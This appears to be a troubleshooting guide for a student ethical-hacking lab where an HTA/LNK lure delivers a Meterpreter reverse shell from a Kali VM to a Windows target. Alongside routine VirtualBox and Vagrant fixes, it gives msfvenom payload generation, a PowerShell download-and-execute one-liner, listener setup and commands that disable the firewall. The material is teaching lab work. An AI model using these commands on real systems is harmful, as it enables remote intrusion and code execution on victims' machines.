# Troubleshooting Guide
## Ethical Hacking Lab - HTA Exploit

This guide covers common issues with the HTA exploit lab and their solutions.

---

## Quick Diagnostic Flowchart

Use this flowchart to quickly identify your issue:

```mermaid
graph TD
    START{What's the problem?} -->|Setup fails| SETUP_BRANCH{Which error?}
    START -->|VMs won't communicate| NETWORK_BRANCH{Which test fails?}
    START -->|HTA exploit doesn't work| EXPLOIT_BRANCH{What happens?}
    START -->|No Meterpreter session| METASPLOIT_BRANCH{Which stage?}
    START -->|Performance issues| PERF_BRANCH{What's slow?}

    SETUP_BRANCH -->|VirtualBox not found| S1[Install VirtualBox<br/>Setup Issues #1]
    SETUP_BRANCH -->|Vagrant not found| S2[Install Vagrant<br/>Setup Issues #2]
    SETUP_BRANCH -->|VT-x not enabled| S3[Enable in BIOS<br/>Setup Issues #4]
    SETUP_BRANCH -->|Disk space| S4[Free up 40GB<br/>Setup Issues #3]

    NETWORK_BRANCH -->|Can't ping Windows| N1[Check Host-Only network<br/>Network Problems #1]
    NETWORK_BRANCH -->|Can't reach HTTP| N2[Check HTTP server<br/>Network Problems #3]
    NETWORK_BRANCH -->|Kali has wrong IP| N3[Reconfigure network<br/>Network Problems #2]

    EXPLOIT_BRANCH -->|HTA doesn't execute| E1[Check file association<br/>HTA Exploit Problems #3]
    EXPLOIT_BRANCH -->|Downloads but fails| E2[Check payload syntax<br/>HTA Exploit Problems #4]
    EXPLOIT_BRANCH -->|HTA not created| E3[Run create_exe_payload.sh<br/>HTA Exploit Problems #1]

    METASPLOIT_BRANCH -->|Listener won't start| M1[Port 4444 in use<br/>Metasploit Issues #1]
    METASPLOIT_BRANCH -->|Session closes immediately| M2[Use AutoRunScript<br/>Metasploit Issues #2]
    METASPLOIT_BRANCH -->|Stuck at 'Sending stage'| M3[Check firewall<br/>Metasploit Issues #3]

    PERF_BRANCH -->|VMs very slow| P1[Allocate more resources<br/>Performance Issues #1]
    PERF_BRANCH -->|Disk space low| P2[Clean up Vagrant boxes<br/>Performance Issues #2]

    style START fill:#3498db,color:#fff
    style S1 fill:#e74c3c,color:#fff
    style S2 fill:#e74c3c,color:#fff
    style S3 fill:#e74c3c,color:#fff
    style S4 fill:#e74c3c,color:#fff
    style N1 fill:#f39c12,color:#fff
    style N2 fill:#f39c12,color:#fff
    style N3 fill:#f39c12,color:#fff
    style E1 fill:#9b59b6,color:#fff
    style E2 fill:#9b59b6,color:#fff
    style E3 fill:#9b59b6,color:#fff
    style M1 fill:#1abc9c,color:#fff
    style M2 fill:#1abc9c,color:#fff
    style M3 fill:#1abc9c,color:#fff
    style P1 fill:#34495e,color:#fff
    style P2 fill:#34495e,color:#fff
```



**Color Legend:**
- 🔴 Red: Setup/Installation issues
- 🟠 Orange: Network connectivity issues
- 🟣 Purple: HTA exploit issues
- 🟢 Teal: Metasploit/listener issues
- ⚫ Dark: Performance/resource issues

---

## Table of Contents

1. [Setup Issues](#setup-issues)
2. [Network Problems](#network-problems)
3. [VM Issues](#vm-issues)
4. [HTA Exploit Problems](#hta-exploit-problems)
5. [Metasploit Issues](#metasploit-issues)
6. [Performance Issues](#performance-issues)
7. [General Tips](#general-tips)

---

## Setup Issues

### Issue: "VirtualBox not found"

**Symptoms:**
```
✗ VirtualBox not found
Please install VirtualBox from: https://www.virtualbox.org/
```

**Solution:**
1. Download VirtualBox from https://www.virtualbox.org/
2. Install for your operating system
3. Restart terminal
4. Run `VBoxManage --version` to verify

**macOS Specific:**
- May need to approve in System Preferences > Security & Privacy
- Reboot after installation

---

### Issue: "Vagrant not found"

**Symptoms:**
```
✗ Vagrant not found
Please install Vagrant from: https://www.vagrantup.com/
```

**Solution:**
1. Download Vagrant from https://www.vagrantup.com/
2. Install for your operating system
3. Restart terminal
4. Run `vagrant --version` to verify

---

### Issue: "Insufficient disk space"

**Symptoms:**
```
✗ Insufficient disk space
Available: 25GB, Required: 40GB
```

**Solution:**
```bash
# Check disk usage
df -h

# Free up space:
# 1. Remove old Vagrant boxes
vagrant box prune

# 2. Remove unused Docker images (if applicable)
docker system prune -a

# 3. Empty trash/recycle bin
# 4. Uninstall unused applications
```

---

### Issue: "VT-x/AMD-V not enabled"

**Symptoms:**
- VMs fail to start
- Error about virtualization

**Solution:**
1. Reboot computer
2. Enter BIOS/UEFI (F2, F10, or DEL during boot)
3. Find "Virtualization Technology" or "VT-x" or "AMD-V"
4. Enable it
5. Save and reboot

**Verify:**
```bash
# Linux
egrep -c '(vmx|svm)' /proc/cpuinfo
# Output > 0 = enabled

# macOS
sysctl -a | grep machdep.cpu.features | grep VMX
```

---

## Network Problems

### Issue: VMs can't communicate (Kali ↔ Windows)

**Symptoms:**
- Ping fails between VMs
- HTTP server not reachable
- Meterpreter won't connect

**Diagnosis:**
```bash
# On Kali
ping 192.168.56.102

# On Windows (PowerShell)
Test-Connection 192.168.56.101
```

**Solution 1: Verify Host-Only Network**
```bash
# Check if network exists
VBoxManage list hostonlyifs

# If missing, recreate
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```

**Solution 2: Reconfigure Kali Network**
```bash
# SSH into Kali
vagrant ssh kali

# Check interfaces
ip addr show

# Manually configure if needed
sudo ip addr add 192.168.56.101/24 dev eth1
sudo ip link set eth1 up
sudo ip route add 192.168.56.0/24 dev eth1
```

**Solution 3: Restart VMs**
```bash
cd vagrant
vagrant reload
```

---

### Issue: Kali network interface not configured

**Symptoms:**
- Kali doesn't have IP 192.168.56.101
- Network provisioning script fails

**Solution:**
```bash
# SSH into Kali
vagrant ssh kali

# Run network configuration script manually
sudo /vagrant/vagrant/provisioning/kali/configure_network_early.sh

# Verify
ip addr show | grep 192.168.56.101
```

---

### Issue: "HTTP server not responding" during Windows boot

**Symptoms:**
- During initial setup or reboot, Windows shows "HTTP server not responding"
- Test shows WARNING instead of SUCCESS

**This is Normal:**
- The HTTP server starts automatically on Kali via systemd service
- It may take 10-30 seconds after boot for the service to be fully ready
- Windows connectivity test will retry for up to 30 seconds
- If it still shows WARNING, the server will be ready shortly after boot completes

**Verify HTTP server is running:**
```bash
# SSH into Kali
vagrant ssh kali

# Check service status
sudo systemctl status hta-http-server.service

# Should show: Active: active (running)
```

**If service is not running:**
```bash
# Start the service
sudo systemctl start hta-http-server.service

# Check for errors
sudo journalctl -u hta-http-server.service -n 50
```

---

### Issue: Windows can't reach HTTP server

**Symptoms:**
- `Invoke-WebRequest` fails
- HTA exploit can't download payload

**Diagnosis:**
```powershell
# On Windows
Test-Connection 192.168.56.101
Invoke-WebRequest http://192.168.56.101:8080/shell.ps1
```

**Solution:**
```bash
# On Kali, verify HTTP server is running
ss -tuln | grep 8080

# Check systemd service status
sudo systemctl status hta-http-server.service

# If not running, start the service
sudo systemctl start hta-http-server.service

# Or start manually if needed
cd /home/vagrant/hta_payloads
python3 -m http.server 8080 --bind 192.168.56.101 &

# Test from Kali
curl http://192.168.56.101:8080/shell.ps1
```

---

## VM Issues

### Issue: Kali VM won't boot

**Symptoms:**
- Vagrant hangs at "Waiting for machine to boot"
- SSH timeout

**Solution 1: Increase Timeout**
Edit `vagrant/Vagrantfile`:
```ruby
kali.vm.boot_timeout = 900  # 15 minutes
kali.ssh.connect_timeout = 600
```

**Solution 2: Destroy and Rebuild**
```bash
cd vagrant
vagrant destroy kali -f
vagrant up kali
```

---

### Issue: Windows VM won't boot

**Symptoms:**
- GUI doesn't appear
- WinRM timeout

**Solution 1: Increase Timeout**
Edit `vagrant/Vagrantfile`:
```ruby
win.vm.boot_timeout = 900
win.winrm.timeout = 1800
```

**Solution 2: Check VirtualBox GUI**
1. Open VirtualBox Manager
2. Find Windows VM
3. Start manually
4. Check for errors in GUI

---

### Issue: VM stuck at provisioning

**Symptoms:**
- Setup hangs during provisioning
- Script doesn't complete

**Solution:**
```bash
# Cancel setup (Ctrl+C)

# SSH into VM manually
vagrant ssh kali  # or: vagrant winrm win2k8

# Run provisioning script manually
cd /vagrant/vagrant/provisioning/kali
./configure_network_early.sh
./install_tools.sh
./create_exe_payload.sh
```

---

## HTA Exploit Problems

### Issue: HTA file not created

**Symptoms:**
- `Q4_Financial_Report.pdf.lnk` missing
- Provisioning completed but no HTA

**Solution:**
```bash
# SSH into Kali
vagrant ssh kali

# Manually run HTA generation script
cd /vagrant/vagrant/provisioning/kali
./create_exe_payload.sh

# Verify files created
ls -la /vagrant/exploits/hta/
```

---

### Issue: PowerShell payload missing

**Symptoms:**
- `shell.ps1` not found
- HTTP server can't serve payload

**Solution:**
```bash
# Generate manually on Kali
vagrant ssh kali

# Create payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -a x64 \
    --platform windows \
    -f psh \
    -o /vagrant/exploits/hta/shell.ps1

# Verify
cat /vagrant/exploits/hta/shell.ps1
```

---

### Issue: HTA file doesn't execute

**Symptoms:**
- Double-clicking does nothing
- No PowerShell window (even hidden)
- No network activity

**Diagnosis:**
```powershell
# On Windows, test PowerShell command manually
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
```

**Solution 1: Check File Association**
```powershell
# Verify .lnk files open with Explorer
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.lnk
```

**Solution 2: Check Windows Security**
```powershell
# Verify security is disabled
Get-NetFirewallProfile | Select Name, Enabled
Get-MpPreference | Select DisableRealtimeMonitoring
```

**Solution 3: Regenerate HTA**
```bash
# On Kali
vagrant ssh kali
cd /vagrant/vagrant/provisioning/kali
./create_exe_payload.sh
```

---

### Issue: HTA downloads but doesn't execute payload

**Symptoms:**
- HTTP server shows GET request
- But no Meterpreter session

**Diagnosis:**
```bash
# Check HTTP server logs
cat /tmp/http_server.log

# Check Metasploit listener
# In msfconsole:
jobs
```

**Solution:**
```bash
# Verify payload syntax
vagrant ssh kali
cat /vagrant/exploits/hta/shell.ps1

# Should start with: function, $, or Invoke-

# Test payload manually on Kali
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; exploit"

# Then on Windows:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
```

---

## Metasploit Issues

### Issue: Meterpreter listener won't start

**Symptoms:**
- "Address already in use" error
- Port 4444 blocked

**Solution:**
```bash
# Check what's using port 4444
ss -tuln | grep 4444

# Kill existing process
ps aux | grep msfconsole
kill <PID>

# Or use different port
# Edit start_hta_attack.sh:
LPORT="5555"
```

---

### Issue: Session opens then immediately closes

**Symptoms:**
- "Meterpreter session 1 opened"
- Then "Meterpreter session 1 closed"

**Solution:**
```bash
# Use AutoRunScript to migrate process
# In start_hta_attack.sh resource file, add:
set AutoRunScript post/windows/manage/migrate

# Or manually migrate after session opens
meterpreter > ps
meterpreter > migrate <PID_of_explorer.exe>
```

---

### Issue: "Sending stage" hangs forever

**Symptoms:**
- Listener shows "Sending stage"
- Never completes

**Solution 1: Check Firewall**
```powershell
# On Windows
Get-NetFirewallProfile | Select Name, Enabled
# Should show: Enabled = False

# If enabled, disable
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Solution 2: Check Network**
```bash
# Verify bidirectional connectivity
# From Kali:
ping 192.168.56.102

# From Windows:
Test-Connection 192.168.56.101
```

---

## Performance Issues

### Issue: VMs are very slow

**Symptoms:**
- Laggy GUI
- Commands take long time
- High CPU usage on host

**Solution 1: Allocate More Resources**
Edit `vagrant/Vagrantfile`:
```ruby
kali.vm.provider "virtualbox" do |vb|
  vb.memory = "4096"  # Increase from 3GB to 4GB
  vb.cpus = 4         # Increase from 2 to 4
end
```

**Solution 2: Close Other Applications**
- Close browser tabs
- Stop Docker containers
- Close IDE/editors
- Disable antivirus scans

**Solution 3: Use Headless Mode**
For Windows VM:
```ruby
win.vm.provider "virtualbox" do |vb|
  vb.gui = false  # Run headless
end
```

---

### Issue: Disk space running out

**Symptoms:**
- "No space left on device"
- VMs won't start

**Solution:**
```bash
# Clean up Vagrant boxes
vagrant box prune

# Compact VMs
cd vagrant
vagrant halt

# Find VM disk locations
VBoxManage list vms

# Compact (replace with actual path)
VBoxManage modifymedium disk /path/to/vm.vdi --compact

# Remove old snapshots
VBoxManage snapshot "VM_NAME" delete "Old_Snapshot"
```

---

## General Tips

### Reset Everything

If nothing works, nuclear option:

```bash
# 1. Destroy VMs
cd vagrant
vagrant destroy -f

# 2. Remove boxes
vagrant box remove kalilinux/rolling --all
vagrant box remove rapid7/metasploitable3-win2k8 --all

# 3. Remove network
VBoxManage hostonlyif remove vboxnet0

# 4. Clean Vagrant cache
rm -rf ~/.vagrant.d/boxes/*
rm -rf .vagrant/

# 5. Start fresh
cd ..
./setup.sh
```

---

### Enable Debug Mode

For Vagrant issues:

```bash
# Run with debug output
VAGRANT_LOG=info vagrant up

# Or for more detail
VAGRANT_LOG=debug vagrant up 2>&1 | tee vagrant.log
```

---

### Check Logs

**Kali Logs:**
```bash
vagrant ssh kali
sudo journalctl -xe
dmesg | tail -50
```

**Windows Event Logs:**
```powershell
# On Windows
Get-EventLog -LogName System -Newest 50
Get-EventLog -LogName Application -Newest 50

# PowerShell logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50
```

---

### Verify Provisioning

Check if all provisioning scripts ran:

```bash
# Check Kali
vagrant ssh kali
ls -la /home/vagrant/.msf4/local/
# Should see shell.ps1 and HTA file

# Check Windows
vagrant winrm win2k8 -c "dir C:\vagrant\exploits\hta"
# Should see HTA file
```

---

### Network Diagnostic Commands

**On Kali:**
```bash
# Network interfaces
ip addr show

# Routing table
ip route show

# Test connectivity
ping 192.168.56.102
nc -zv 192.168.56.102 445  # SMB port

# DNS (should fail - no internet)
ping google.com
```

**On Windows:**
```powershell
# Network configuration
ipconfig /all

# Routing table
route print

# Test connectivity
Test-Connection 192.168.56.101
Test-NetConnection 192.168.56.101 -Port 8080
```

---

### Still Need Help?

1. **Check documentation:**
   - [README.md](README.md) - Main guide
   - [INSTALLATION.md](INSTALLATION.md) - Setup instructions
   - [exploits/hta/README.md](exploits/hta/README.md) - Exploit details
   - [docs/NETWORK_DEBUGGING_GUIDE.md](docs/NETWORK_DEBUGGING_GUIDE.md)

2. **Gather information:**
   - Your OS and version
   - VirtualBox version: `VBoxManage --version`
   - Vagrant version: `vagrant --version`
   - Error messages (full output)
   - What you tried already

3. **Open GitHub issue:**
   - https://github.com/gcheliz/ethical-hacking-student-lab/issues
   - Include all information above
   - Steps to reproduce

4. **Ask instructor:**
   - Provide error logs
   - Screenshots of errors
   - What troubleshooting steps you tried

---

**Most issues are network-related. Start with network troubleshooting first!**

---

*Last Updated: 2026-01-09*
*Version: 2.0 - HTA Exploit Lab*
